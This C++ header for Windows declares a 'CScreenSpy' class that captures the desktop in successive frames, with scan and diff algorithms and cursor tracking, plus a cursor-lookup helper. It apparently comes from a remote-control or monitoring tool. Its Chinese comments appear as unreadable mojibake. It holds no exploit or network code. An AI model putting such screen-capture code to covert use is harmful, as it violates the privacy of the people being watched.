// ScreenSpy.h: interface for the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SCREENSPY_H__6600B30F_A7E3_49D4_9DE6_9C35E71CE3EE__INCLUDED_)
#define AFX_SCREENSPY_H__6600B30F_A7E3_49D4_9DE6_9C35E71CE3EE__INCLUDED_
#include <windows.h>

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000


#define MAX_CURSOR_TYPE	16
#define IDC_HAND MAKEINTRESOURCE(32649)
class CCursorInfo  
{
private:
	LPCTSTR	m_CursorResArray[MAX_CURSOR_TYPE];
	HCURSOR	m_CursorHandleArray[MAX_CURSOR_TYPE];

public:
	CCursorInfo()
	{
		LPCTSTR	CursorResArray[MAX_CURSOR_TYPE] = 
		{
			IDC_APPSTARTING,
			IDC_ARROW,
			IDC_CROSS,
			IDC_HAND,
			IDC_HELP,
			IDC_IBEAM,
			IDC_ICON,
			IDC_NO,
			IDC_SIZE,
			IDC_SIZEALL,
			IDC_SIZENESW,
			IDC_SIZENS,
			IDC_SIZENWSE,
			IDC_SIZEWE,
			IDC_UPARROW,
			IDC_WAIT
		};
		
		for (int i = 0; i < MAX_CURSOR_TYPE; i++)
		{
			m_CursorResArray[i] = CursorResArray[i];
			m_CursorHandleArray[i] = LoadCursor(NULL, CursorResArray[i]);
		}
	}

	virtual ~CCursorInfo()
	{
		for (int i = 0; i < MAX_CURSOR_TYPE; i++)
		DestroyCursor(m_CursorHandleArray[i]);
	}


	int getCurrentCursorIndex()
	{
		CURSORINFO	ci;
		ci.cbSize = sizeof(CURSORINFO);
		if (!GetCursorInfo(&ci) || ci.flags != CURSOR_SHOWING)
			return -1;
		
		int i;
		for (i = 0; i < MAX_CURSOR_TYPE; i++)
		{
			if (ci.hCursor == m_CursorHandleArray[i])
				break;
		}
		DestroyCursor(ci.hCursor);
		
		int	nIndex = i == MAX_CURSOR_TYPE ? -1 : i;
		return nIndex;
	}
	
	HCURSOR getCursorHandle( int nIndex )
	{
		if (nIndex >= 0 && nIndex < MAX_CURSOR_TYPE)
			return	m_CursorHandleArray[nIndex];
		else
			return NULL;
	}
};

// �����㷨
#define ALGORITHM_SCAN	1	// �ٶȺܿ죬����Ƭ̫��
#define ALGORITHM_DIFF	2	// �ٶȺ�����ҲռCPU������������������С��

class CScreenSpy  
{
public:
	CScreenSpy(int biBitCount= 8, bool bIsGray= false, UINT nMaxFrameRate = 100);
	virtual ~CScreenSpy();
	LPVOID getFirstScreen();
	LPVOID getNextScreen(LPDWORD lpdwBytes);

	void setAlgorithm(UINT nAlgorithm);
	LPBITMAPINFO getBI();
	UINT	getBISize();
	UINT	getFirstImageSize();
	void	setCaptureLayer(bool bIsCaptureLayer);
private:
	BYTE m_bAlgorithm;
	UINT m_nMaxFrameRate;
	bool m_bIsGray;
	DWORD m_dwBitBltRop;
	DWORD m_dwLastCapture;
	DWORD m_dwSleep;
	LPBYTE m_rectBuffer;
	UINT m_rectBufferOffset;
	BYTE m_nIncSize;
	int m_nFullWidth, m_nFullHeight, m_nStartLine;
	RECT m_changeRect;
	HDC m_hFullDC, m_hLineMemDC, m_hFullMemDC, m_hRectMemDC;
	HBITMAP m_hLineBitmap, m_hFullBitmap;
	LPVOID m_lpvLineBits, m_lpvFullBits;
	LPBITMAPINFO m_lpbmi_line, m_lpbmi_full, m_lpbmi_rect;
	int	m_biBitCount;
	int	m_nDataSizePerLine;

	LPVOID m_lpvDiffBits; // ����Ƚϵ���һ��
	HDC	m_hDiffDC, m_hDiffMemDC;
	HBITMAP	m_hDiffBitmap;

	CCursorInfo	m_CursorInfo;
	void ScanScreen(HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight); // ����CPU
	int Compare(LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize);
	LPBITMAPINFO ConstructBI(int biBitCount, int biWidth, int biHeight);
	void WriteRectBuffer(LPBYTE	lpData, int nCount);
	bool ScanChangedRect(int nStartLine);
	void CopyRect(LPRECT lpRect);
	bool SelectInputWinStation();
	HWND m_hDeskTopWnd;
};

#endif // !defined(AFX_SCREENSPY_H__6600B30F_A7E3_49D4_9DE6_9C35E71CE3EE__INCLUDED_)
